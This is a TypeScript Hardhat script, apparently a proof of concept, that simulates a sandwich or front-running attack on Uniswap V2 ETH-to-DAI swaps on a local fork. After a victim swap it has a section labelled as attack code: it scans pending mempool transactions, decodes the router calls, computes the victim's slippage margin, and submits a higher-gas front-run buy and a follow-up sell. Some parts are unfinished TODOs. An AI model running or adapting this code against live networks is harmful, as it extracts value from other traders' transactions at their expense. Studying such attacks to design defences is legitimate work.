import { network, ethers } from 'hardhat'
// @ts-ignore
import * as DaiAbi from '../contracts/interfaces/Dai.json'
// @ts-ignore
import * as IUniswapV2Router02 from '@uniswap/v2-periphery/build/IUniswapV2Router02.json'
// @ts-ignore
import * as IUniswapV2Pair from '@uniswap/v2-core/build/IUniswapV2Pair.json'
const abiDecoder = require('abi-decoder')

const uniswapV2RouterAddress = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
const daiAddress = '0x6B175474E89094C44Da98b954EedeAC495271d0F'
const uniswapV2DaiEthPairAddress = '0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11'

const BigNumber = ethers.BigNumber
type BigNumber = ReturnType<typeof ethers.BigNumber.from>

async function main() {
    /// Simulate an ETH->DAI swap on Uniswap V2
    const amountEthToSwap = ethers.utils.parseEther('1000.0')
    const slippageTolerance = BigNumber.from(10) // Percentage, integers only, 100 == 100%

    // Get quote from Uniswap Router
    const uniswapV2Router = await new ethers.Contract(
        uniswapV2RouterAddress,
        IUniswapV2Router02.abi,
        await ethers.getSigner((await ethers.getSigners())[0].address)
    )
    const wethAddress = (await uniswapV2Router.functions.WETH())[0]
    const amountsOut = (
        await uniswapV2Router.functions.getAmountsOut(amountEthToSwap, [wethAddress, daiAddress])
    )[0]
    const inAmount = BigNumber.from(amountsOut[0])
    const outAmount = BigNumber.from(amountsOut[1])
    console.log(
        `Quote: ${ethers.utils.formatEther(inAmount.toString()).toString()} ETH -> ${ethers.utils
            .formatEther(outAmount.toString())
            .toString()} DAI`
    )

    // Calculate minimum output amount of DAI within our slippage tolerance
    const minOutAmountDai = outAmount.div(100).mul(BigNumber.from(100).sub(slippageTolerance))
    console.log(`Minimum received: ${ethers.utils.formatEther(minOutAmountDai)} DAI`)

    // Build swap transaction with slippage calculated
    const signers = await ethers.getSigners()
    const signer = signers[0] // Loaded with 10k ETH
    const deadline = Date.now() + 60 * 1000 // 1 minute
    const swapTx = await uniswapV2Router.populateTransaction.swapExactETHForTokens(
        minOutAmountDai,
        [wethAddress, daiAddress],
        signer.address,
        deadline,
        {
            value: amountEthToSwap, // ETH to send (in wei)
            gasLimit: BigNumber.from(300000), // DAI swap is usually ~200k gas
            gasPrice: BigNumber.from(100).mul(BigNumber.from(10).pow(9)), // in wei
        }
    )
    const swapTxResult = await signer.sendTransaction(swapTx)
    console.log(`Sent tx ${swapTxResult.hash} from ${signer.address}!`)

    /// Begin attack code

    // Pending transactions
    const pendingBlock = await network.provider.send('eth_getBlockByNumber', ['pending', false])
    console.log(
        `There are ${pendingBlock.transactions.length} pending transactions in the next block.`
    )

    abiDecoder.addABI(IUniswapV2Router02.abi)
    for (const txHash of pendingBlock.transactions as string[]) {
        const tx = await network.provider.send('eth_getTransactionByHash', [txHash])
        // As the attacker, we are only interested in txes directed to this particular contract
        if (!BigNumber.from(tx.to).eq(uniswapV2RouterAddress)) {
            console.log(tx.to)
            console.log('Skipping tx: not UniswapV2Router')
            continue
        }
        const decodedCall = abiDecoder.decodeMethod(tx.input) // We assume this throws in invalid txes
        // For this particular attack, we are only interested in this transaction
        // if it's the swap ETH->token method
        if (decodedCall.name !== 'swapExactETHForTokens') {
            console.log('Skipping tx: not swapExactETHForTokens')
            continue
        }
        const pathParam = decodedCall.params.find((param: any) => param.name === 'path')
        // For this attack, we are only interested in this transaction
        // if the path begins with WETH (input currency) and ends with DAI (output currency)
        if (
            !BigNumber.from(pathParam.value[0]).eq(wethAddress) ||
            !BigNumber.from(pathParam.value[pathParam.value.length - 1]).eq(daiAddress)
        ) {
            console.warn('Skipping tx, not WETH->DAI swap')
            continue
        }

        const attacker = signers[1]
        const uniswapV2Router = await new ethers.Contract(
            uniswapV2RouterAddress,
            IUniswapV2Router02.abi,
            await ethers.getSigner(attacker.address)
        )

        const amountOutMinParam = decodedCall.params.find(
            (param: any) => param.name === 'amountOutMin'
        )
        /** This is the amount of DAI the user will receive as minimum */
        const userMinDaiValue = BigNumber.from(amountOutMinParam.value)
        const userWethValue = BigNumber.from(tx.value)

        // Query maximum output amount of DAI with this amount of WETH as input
        const amountsOut = (
            await uniswapV2Router.functions.getAmountsOut(userWethValue, [wethAddress, daiAddress])
        )[0]
        const actualDaiOutAmount = BigNumber.from(amountsOut[1])

        // Compare to DAI output from querying price - what is the slippage tolerance?
        if (!actualDaiOutAmount.gt(userMinDaiValue)) {
            // There is no value to extract
            console.warn(
                `No value to extract: required DAI is ${ethers.utils.formatEther(
                    userMinDaiValue
                )} DAI and actual output amount is ${ethers.utils.formatEther(
                    actualDaiOutAmount
                )} DAI`
            )
            continue
        }

        const uniswapV2DaiEthPair = await new ethers.Contract(
            uniswapV2DaiEthPairAddress,
            IUniswapV2Pair.abi,
            await ethers.getSigner((await ethers.getSigners())[0].address)
        )
        const [daiReserve, wethReserve] = (await uniswapV2DaiEthPair.functions.getReserves()) as [
            BigNumber,
            BigNumber
        ]
        console.log(
            `DAI: ${ethers.utils.formatEther(daiReserve)}, WETH: ${ethers.utils.formatEther(
                wethReserve
            )}`
        )
        /** DAI-WETH constant product k = dai_liq * eth_liq */
        const k = daiReserve.mul(wethReserve)
        console.log(`k: ${k}`)

        // User expects a minimum amount of DAI. (`userMinDaiValue`)
        // We now calculate how much ETH we can sell s.t.
        // the user gets >= minimum amount of DAI expected.

        // Frontrun ETH->DAI with calculated slippage
        const amountEthToSwap = ethers.utils.parseEther('10')
        const frontrunPumpTx = await uniswapV2Router.populateTransaction.swapExactETHForTokens(
            userMinDaiValue,
            [wethAddress, daiAddress],
            attacker.address,
            deadline,
            {
                value: amountEthToSwap, // ETH to send (in wei)
                gasLimit: BigNumber.from(300000), // DAI swap is usually ~200k gas
                // Jack the gas price based on user's trade to be included before user's trade
                gasPrice: BigNumber.from(100).mul(BigNumber.from(10).pow(9)).add(tx.gasPrice),
            }
        )
        const frontrunPumpTxResult = await attacker.sendTransaction(frontrunPumpTx)
        console.log(`Sent frontrun pump tx ${frontrunPumpTxResult.hash} from ${attacker.address}!`)

        const amountDaiSell = userMinDaiValue // TODO: Get actual amount
        const frontrunDumpTx = await uniswapV2Router.populateTransaction.swapExactTokensForETH(
            amountDaiSell,
            amountEthToSwap.div(100).mul(101),
            [daiAddress, wethAddress],
            attacker.address,
            deadline,
            {
                gasLimit: BigNumber.from(300000), // DAI swap is usually ~200k gas
                // Set the gas price to user's trade -1 gwei
                gasPrice: tx.gasPrice,
            }
        )
        const frontrunDumpTxResult = await attacker.sendTransaction(frontrunDumpTx)
        console.log(`Sent frontrun dump tx ${frontrunDumpTxResult.hash} from ${attacker.address}!`)
    }

    // Show pending block with inserted transactions
    const pendingBlockWithInsertedTxes = await network.provider.send('eth_getBlockByNumber', [
        'pending',
        false,
    ])
    console.log(pendingBlockWithInsertedTxes)
    // Signal to the miner to mine the block
    await network.provider.send('evm_mine', [])

    // TODO: Query balances
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })

// function calcAmountEthRequired(reserve0: BigNumber, reserve1: BigNumber, inToken1: BigNumber) {
//     // Calculate constant product
//     const k = reserve0.mul(reserve1)

//     // Initial reserves
//     const x_0 = reserve0
//     const y_0 = reserve1

//     x_0.mul(y_0)
// }
